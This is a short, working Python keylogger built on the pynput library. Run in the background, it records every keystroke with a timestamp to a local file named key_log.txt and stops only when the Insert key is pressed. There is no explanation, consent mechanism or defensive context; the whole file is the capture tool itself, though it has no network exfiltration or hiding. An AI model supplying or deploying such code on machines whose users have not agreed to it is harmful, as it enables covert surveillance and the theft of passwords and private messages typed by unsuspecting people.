from pynput.keyboard import Key, Listener
import sys
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if(str(key) == "Key.insert"):
        sys.exit()

with Listener(on_press=on_press) as listener:
    listener.join()
